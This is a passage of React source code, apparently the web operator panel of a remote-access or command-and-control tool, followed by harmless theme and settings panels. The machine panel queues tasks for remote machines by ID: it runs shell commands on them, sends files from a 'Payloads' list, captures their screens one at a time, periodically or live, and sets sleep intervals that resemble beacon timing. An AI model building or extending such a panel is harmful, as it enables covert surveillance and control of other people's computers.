      const url = `${server}/addtask?task_id=${encodeURIComponent(id)}&task_type=SCREENSHOT&machine_id=${encodeURIComponent(machineId)}`
      await fetch(url, {method:'POST'})
      setScreenshot(null)
      // watch for the screenshot upload
      watchForScreenshot(id, machineId, (found) => {
        setScreenshot(found.image_b64)
      })
    }catch(e){ setLog(prev => [`Error requesting screenshot: ${String(e)}`, ...prev]) }
  }

  const loadScreenshots = async () =>{
    try{
      const r = await fetch(server + '/screenshots?machine_id=' + encodeURIComponent(machineId))
      const d = await r.json()
      const list = (d.screenshots || [])
      setScreenshotsList(list)
      setSavedScreensCount(list.length)
      if (list.length){
        const last = list[list.length - 1]
        setScreenshot(last.image_b64)
        screenshotIdRef.current = last.id
      } else {
        setScreenshot(null)
        screenshotIdRef.current = null
      }
    }catch(e){ /* ignore */ }
  }

  const downloadImage = (b64, id) =>{
    try{
      const a = document.createElement('a')
      a.href = `data:image/png;base64,${b64}`
      a.download = `${machineId}_${id || Date.now()}.png`
      document.body.appendChild(a)
      a.click()
      a.remove()
    }catch(e){ setLog(prev => [`Download error: ${String(e)}`, ...prev]) }
  }

  // load current periodic screenshots setting for this machine
  useEffect(()=>{
    let mounted = true
    ;(async ()=>{
      try{
        const r = await fetch(server + '/clients_status')
        const d = await r.json()
        const info = (d.clients_status || {})[machineId] || {}
        if(mounted) setPeriodicEnabled(Boolean(info.periodic_screenshots))
        // load per-machine config (max screenshots retained)
        try{
          const rc = await fetch(server + '/machine_config?machine_id=' + encodeURIComponent(machineId))
          const dc = await rc.json()
          if (mounted) {
            setMaxScreens(dc.config && dc.config.max_screen_images)
            setMinSleep(dc.config && dc.config.min_sleep)
            setMaxSleep(dc.config && dc.config.max_sleep)
          }
        }catch(e){}
        // load current screenshots list & count
        try{ await loadScreenshots() }catch(e){}
      }catch(e){}
    })()
    return ()=> mounted = false
  }, [server, machineId])

  const togglePeriodic = async () =>{
    try{
      const enable = !periodicEnabled
      const url = `${server}/toggle_periodic_screenshots?machine_id=${encodeURIComponent(machineId)}&enabled=${enable ? 'true':'false'}`
      const r = await fetch(url, { method: 'POST' })
      if(r.ok){ setPeriodicEnabled(enable) }
    }catch(e){ setLog(prev => [`Toggle periodic error: ${String(e)}`, ...prev]) }
  }

  const saveConfig = async () =>{
    try{
      const body = { machine_id: machineId, max_screen_images: maxScreens, min_sleep: minSleep, max_sleep: maxSleep }
      const r = await fetch(server + '/set_machine_config', { method: 'POST', headers: {'content-type':'application/json'}, body: JSON.stringify(body) })
      if(r.ok){
        // refresh saved screenshots count
        try{ const rs = await fetch(server + '/screenshots?machine_id=' + encodeURIComponent(machineId)); const ds = await rs.json(); setSavedScreensCount((ds.screenshots||[]).length) }catch(e){}
      }
    }catch(e){ setLog(prev => [`Save config error: ${String(e)}`, ...prev]) }
  }

  // Poll server for the list of screenshots so gallery and preview stay up-to-date
  useEffect(() => {
    let mounted = true
    let iv = null
    const poll = async () => {
      if (!mounted) return
      try{
        await loadScreenshots()
      }catch(e){}
    }
    poll()
    iv = setInterval(poll, 2000)
    return () => { mounted = false; if (iv) clearInterval(iv) }
  }, [server, machineId])

  const startLive = () =>{
    if(liveRef.current) return
    setLive(true)
    // enqueue first immediately
    requestScreenshotOnce()
    const iv = setInterval(()=> requestScreenshotOnce(), Math.max(500, Number(liveFreq) || 2000))
    liveRef.current = iv
  }

  const stopLive = () =>{
    setLive(false)
    if(liveRef.current){ clearInterval(liveRef.current); liveRef.current = null }
  }

  const handleLiveToggle = (on) => {
    if (on) startLive(); else stopLive();
  }

  return (
    <div className='machinePanel'>
      <div className='machineHeader'>
        <div>
          <h3>Machine</h3>
          <div className='small'>{machineId} {nicknames && nicknames[machineId] ? <span style={{color:'var(--muted)', marginLeft:8}}>({nicknames[machineId]})</span> : null}</div>
        </div>
        <div className='machineActions'>
          <button className='btn' onClick={()=>{ navigator.clipboard && navigator.clipboard.writeText(machineId) }}>Copy ID</button>
          <button className='btn' onClick={()=>{ const res = window.prompt('Set nickname for this machine (blank to clear):', nicknames && nicknames[machineId] ? nicknames[machineId] : ''); if(res !== null){ setNickname && setNickname(machineId, res || '') } }}>Set Nickname</button>
          <button className='btn' onClick={()=>{ /* TODO: remote check-in actions */ }}>Refresh</button>
        </div>
      </div>

      <div className='machineTabs'>
        <button className={`tabBtn ${activeTab==='home' ? 'active':''}`} onClick={()=>setActiveTab('home')}>Home</button>
        <button className={`tabBtn ${activeTab==='screen' ? 'active':''}`} onClick={()=>setActiveTab('screen')}>Screen</button>
        <button className={`tabBtn ${activeTab==='config' ? 'active':''}`} onClick={()=>setActiveTab('config')}>Config</button>
      </div>

      {activeTab === 'home' && (
        <>
          <div className='card'>
            <h4>Terminal</h4>
            <div style={{marginTop:10}}>
              <h5>Terminal output</h5>
              <div ref={terminalRef} className='terminalWindow'>
                {log.map((l,i)=> {
                  const cls = l.startsWith('Sent:') ? 'term-sent' : (l.startsWith('Waiting for result') ? 'term-wait' : (l.startsWith('Result') ? 'term-result' : (l.startsWith('Failed')||l.startsWith('Error') ? 'term-error' : '')))
                  return <div key={i} className={'terminalLine ' + cls}>{l}</div>
                })}
              </div>
            </div>
            <div style={{marginTop:8}} className='terminalBox'>
              <input autoFocus value={terminalCmd} onChange={e=>setTerminalCmd(e.target.value)} onKeyDown={e=>{ if(e.key === 'Enter'){ e.preventDefault(); runCmd() } }} className='terminalInput' placeholder='e.g. whoami or ipconfig' />
              <button className='btn btn--fancy' onClick={runCmd}>Run</button>
            </div>
          </div>

          <div className='card'>
            <h4>Payloads</h4>
            <div className='payloadGrid'>
              {payloads.map(p => <button key={p.id} className='payloadBtn' onClick={()=>sendPayload(p.file_name)}>{p.file_name}</button>)}
            </div>
          </div>
        </>
      )}

      {activeTab === 'screen' && (
        <div className='card tabContent active'>
          <h4>Screen</h4>
          <div style={{display:'flex', gap:12, alignItems:'center'}}>
            <button className='btn' onClick={requestScreenshotOnce}>Request</button>

            <VkCheckbox className='vk-small' checked={periodicEnabled} onChange={async (on) => {
                try{
                  const url = `${server}/toggle_periodic_screenshots?machine_id=${encodeURIComponent(machineId)}&enabled=${on ? 'true':'false'}`
                  const r = await fetch(url, { method: 'POST' })
                  if(r.ok) setPeriodicEnabled(on)
                }catch(err){ setLog(prev => [`Toggle error: ${String(err)}`, ...prev]) }
              }} label={periodicEnabled ? 'Periodic ON' : 'Periodic OFF'} />

            <VkCheckbox className='vk-small' checked={live} onChange={(on)=>{ setLive(on); handleLiveToggle(on) }} label={live ? 'Live ON' : 'Live OFF'} />

            <div style={{display:'flex', alignItems:'center', gap:8, marginLeft:'auto'}}>
              <label className='small'>Freq (ms)</label>
              <input type='number' value={liveFreq} onChange={e=>setLiveFreq(Number(e.target.value||2000))} style={{width:120, padding:6, borderRadius:8, border:'1px solid rgba(255,255,255,0.03)', background:'transparent'}} />
            </div>
          </div>
          {galleryOpen && createPortal(
            <div className='galleryModal' onClick={()=>setGalleryOpen(false)}>
              <div className='galleryContent' onClick={e=>e.stopPropagation()}>
                <button className='modalClose' onClick={()=>setGalleryOpen(false)}>Close</button>
                <h3 style={{color:'var(--accent)'}}>All Screenshots ({screenshotsList.length})</h3>
                <div style={{height:12}} />
                <div className='galleryGrid'>
                  {screenshotsList.slice().reverse().map(s => (
                    <div key={s.id} className='thumb' style={{borderRadius:8}}>
                      <img className='thumbImg' alt={s.id} src={s.image_b64 ? `data:image/png;base64,${s.image_b64}` : ''} style={{height:140}} />
                      <div className='thumbMeta'>
                        <div className='thumbTime'>{s.task_id ? s.task_id : new Date((s.timestamp||0)*1000).toLocaleString()}</div>
                        <div style={{display:'flex', gap:8}}>
                          <button className='thumbDelete' onClick={async ()=>{ try{ const r = await fetch(server + '/screenshot?id=' + encodeURIComponent(s.id), { method: 'DELETE' }); if(r.ok){ await loadScreenshots() } }catch(err){ setLog(prev => [`Delete screenshot error: ${String(err)}`, ...prev]) } }}>Del</button>
                          <button className='thumbDelete' onClick={()=>downloadImage(s.image_b64, s.id)}>↓</button>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>,
            document.body
          )}

          <div style={{marginTop:8}}>
            {screenshot ? (
              <img alt='screenshot' src={`data:image/png;base64,${screenshot}`} style={{maxWidth:'100%', borderRadius:8, border:'1px solid rgba(255,255,255,0.03)'}} />
            ) : (
              <div style={{padding:12}} className='term-wait'>No screenshot yet</div>
            )}

            {/* Gallery of recent screenshots (preview up to 5) */}
            <div className='screenshotGallery'>
              {screenshotsList.length === 0 && <div style={{color:'var(--muted)'}}>No saved screenshots</div>}
              {screenshotsList.slice(-5).map(s => (
                <div key={s.id} className='thumb'>
                  <img className='thumbImg' alt={s.id} src={s.image_b64 ? `data:image/png;base64,${s.image_b64}` : ''} onClick={()=>{ setScreenshot(s.image_b64); screenshotIdRef.current = s.id }} />
                  <div className='thumbMeta'>
                    <div className='thumbTime'>{s.task_id ? s.task_id : new Date((s.timestamp||0)*1000).toLocaleString()}</div>
                    <div style={{display:'flex', gap:8}}>
                      <button className='thumbDelete' onClick={async (e)=>{ e.stopPropagation(); try{ const r = await fetch(server + '/screenshot?id=' + encodeURIComponent(s.id), { method: 'DELETE' }); if(r.ok){ await loadScreenshots() } }catch(err){ setLog(prev => [`Delete screenshot error: ${String(err)}`, ...prev]) } }}>Del</button>
                      <button className='thumbDelete' onClick={(e)=>{ e.stopPropagation(); downloadImage(s.image_b64, s.id) }}>↓</button>
                    </div>
                  </div>
                </div>
              ))}
              {screenshotsList.length > 5 && (
                <div className='thumb' onClick={()=>setGalleryOpen(true)} style={{cursor:'pointer'}}>
                  <div className='thumbMore'>+{screenshotsList.length - 5} more</div>
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {activeTab === 'config' && (
        <div className='card'>
          <h4>Config</h4>
          <div style={{display:'flex', gap:8, alignItems:'center', marginTop:6}}>
            <div style={{display:'flex', flexDirection:'column'}}>
              <label className='small'>Periodic screenshots</label>
              <div style={{display:'flex', gap:8, marginTop:6, alignItems:'center'}}>
                <VkCheckbox className='vk-small' checked={periodicEnabled} onChange={async (on) => { try{ const url = `${server}/toggle_periodic_screenshots?machine_id=${encodeURIComponent(machineId)}&enabled=${on ? 'true':'false'}`; const r = await fetch(url, { method:'POST' }); if(r.ok) setPeriodicEnabled(on) }catch(err){ setLog(prev => [`Toggle error: ${String(err)}`, ...prev]) } }} />
                <button className='btn' onClick={()=>{ navigator.clipboard && navigator.clipboard.writeText(machineId) }}>Copy ID</button>
                <button className='btn' onClick={async ()=>{ try{ const r = await fetch(server + '/screenshots?machine_id=' + encodeURIComponent(machineId)); const d = await r.json(); setSavedScreensCount((d.screenshots||[]).length) }catch(e){ setLog(prev => [`Refresh screenshots error: ${String(e)}`, ...prev]) } }}>Refresh</button>
              </div>
            </div>

            <div style={{display:'flex', gap:12, alignItems:'center'}}>
              <div style={{display:'flex', flexDirection:'column'}}>
                <label className='small'>Max screenshots to keep</label>
                <input type='number' className='configNumber' value={maxScreens || ''} onChange={e=>setMaxScreens(e.target.value? Number(e.target.value): null)} style={{width:140}} />
              </div>

              <div style={{display:'flex', flexDirection:'column'}}>
                <label className='small'>Min sleep (s)</label>
                <input type='number' className='configNumber' value={minSleep || ''} onChange={e=>setMinSleep(e.target.value? Number(e.target.value): null)} style={{width:120}} />
              </div>

              <div style={{display:'flex', flexDirection:'column'}}>
                <label className='small'>Max sleep (s)</label>
                <input type='number' className='configNumber' value={maxSleep || ''} onChange={e=>setMaxSleep(e.target.value? Number(e.target.value): null)} style={{width:120}} />
              </div>

              <div style={{display:'flex', alignItems:'center', gap:8}}>
                <button className='btn btn--fancy' onClick={saveConfig}>Save</button>
              </div>
            </div>

            <div style={{marginLeft:'auto', color:'var(--muted)'}}>Saved screenshots: {savedScreensCount}</div>
          </div>
        </div>
      )}
    </div>
  )
}

function CustomizePanel(){
  const [accent, setAccent] = useState(getComputedStyle(document.documentElement).getPropertyValue('--accent')?.trim() || '#7ee7ff')
  const [accent2, setAccent2] = useState(getComputedStyle(document.documentElement).getPropertyValue('--accent-2')?.trim() || '#9b7cff')
  const [nebulaIntensity, setNebulaIntensity] = useState(0.9)

  const apply = () =>{
    document.documentElement.style.setProperty('--accent', accent)
    document.documentElement.style.setProperty('--accent-2', accent2)
    // tweak nebula blur / opacity via inline style
    const neb = document.querySelector('.nebula')
    if (neb) neb.style.opacity = String(Math.max(0.2, Math.min(1.0, nebulaIntensity)))
  }

  const applyPreset = (preset) => {
    // presets set CSS variables for quick theme changes
    const p = preset || {}
    if (p['--bg-1']) document.documentElement.style.setProperty('--bg-1', p['--bg-1'])
    if (p['--bg-2']) document.documentElement.style.setProperty('--bg-2', p['--bg-2'])
    if (p['--accent']) document.documentElement.style.setProperty('--accent', p['--accent'])
    if (p['--accent-2']) document.documentElement.style.setProperty('--accent-2', p['--accent-2'])
    if (p['--muted']) document.documentElement.style.setProperty('--muted', p['--muted'])
    if (typeof p.nebula !== 'undefined'){
      const neb = document.querySelector('.nebula')
      if (neb) neb.style.opacity = String(Math.max(0.2, Math.min(1.0, p.nebula)))
    }
  }

  const presets = [
    { name: 'Default', css: {'--bg-1':'#060814','--bg-2':'#0b1020','--accent':'#7ee7ff','--accent-2':'#9b7cff','--muted':'#9aa4b2', nebula:0.9} },
    { name: 'Solar', css: {'--bg-1':'#0b0810','--bg-2':'#1b0a00','--accent':'#ffd27a','--accent-2':'#ff8a5b','--muted':'#b89a7a', nebula:0.7} },
    { name: 'Aurora', css: {'--bg-1':'#001218','--bg-2':'#001f2f','--accent':'#7ef5c6','--accent-2':'#7ec8ff','--muted':'#8fb8b0', nebula:1.0} },
    { name: 'Crimson', css: {'--bg-1':'#14060a','--bg-2':'#2b080f','--accent':'#ff7b9c','--accent-2':'#ffb27b','--muted':'#b08f8f', nebula:0.6} }
  ]

  return (
    <div>
      <h3>Customize</h3>
      <div className='card' style={{marginTop:8}}>
        <div style={{display:'flex', gap:12, alignItems:'center'}}>
          <div style={{display:'flex', flexDirection:'column', gap:8}}>
            <label style={{fontSize:13}}>Accent</label>
            <input type='color' value={accent} onChange={e=>setAccent(e.target.value)} />
          </div>
          <div style={{display:'flex', flexDirection:'column', gap:8}}>
            <label style={{fontSize:13}}>Accent 2</label>
            <input type='color' value={accent2} onChange={e=>setAccent2(e.target.value)} />
          </div>
          <div style={{display:'flex', flexDirection:'column', gap:8}}>
            <label style={{fontSize:13}}>Nebula intensity</label>
            <input type='range' min='0.2' max='1.4' step='0.05' value={nebulaIntensity} onChange={e=>setNebulaIntensity(e.target.value)} />
          </div>
          <div style={{marginLeft:'auto'}}>
            <button className='btn btn--fancy' onClick={apply}>Apply</button>
          </div>
        </div>

        <div style={{marginTop:12}}>
          <label style={{display:'block', marginBottom:8}}><strong>Theme presets</strong></label>
          <div style={{display:'flex', gap:8}}>
            {presets.map(p => (
              <div key={p.name} className='themeSwatch' onClick={()=>applyPreset(p.css)}>
                <div className='swatchBox' style={{background:`linear-gradient(180deg, ${p.css['--accent']}, ${p.css['--accent-2']})`}} />
                <div style={{fontSize:13}}>{p.name}</div>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  )
}

function SettingsPanel(){
  const [value, setValue] = useState(() => { try{ return parseInt(localStorage.getItem('vk_poll_ms')||'10000',10) }catch{return 10000}})
  const [reduce, setReduce] = useState(() => { try{ return localStorage.getItem('vk_reduce_motion') === '1' }catch{return false}})

  const save = () =>{
    try{ localStorage.setItem('vk_poll_ms', String(value)) }catch{}
    try{ localStorage.setItem('vk_reduce_motion', reduce ? '1':'0') }catch{}
    // reload page so main app picks up new pollMs / reduceMotion (simple approach)
    window.location.reload()
  }

  return (
    <div>
      <h3>Settings</h3>
      <div className='card' style={{marginTop:8}}>
        <div style={{display:'flex', flexDirection:'column', gap:12}}>
          <div style={{display:'flex', gap:10, alignItems:'center'}}>
            <label style={{minWidth:220}}>UI polling interval (ms)</label>
            <input type='number' value={value} onChange={e=>setValue(parseInt(e.target.value || '10000',10))} style={{padding:8, borderRadius:8, border:'1px solid rgba(255,255,255,0.03)', background:'transparent'}} />
          </div>

          <div style={{display:'flex', gap:10, alignItems:'center'}}>
            <label style={{minWidth:220}}>Reduce motion (disable animations)</label>
            <VkCheckbox className='vk-small' checked={reduce} onChange={(on)=>setReduce(Boolean(on))} />
          </div>

          <div style={{display:'flex', gap:8, marginTop:6}}>
            <button className='btn btn--fancy' onClick={save}>Save & Reload</button>
            <div style={{alignSelf:'center', color:'var(--muted)', fontSize:13}}>Reload is required for some visual settings to fully apply.</div>
          </div>
        </div>
      </div>
    </div>
  )
}

export default App;
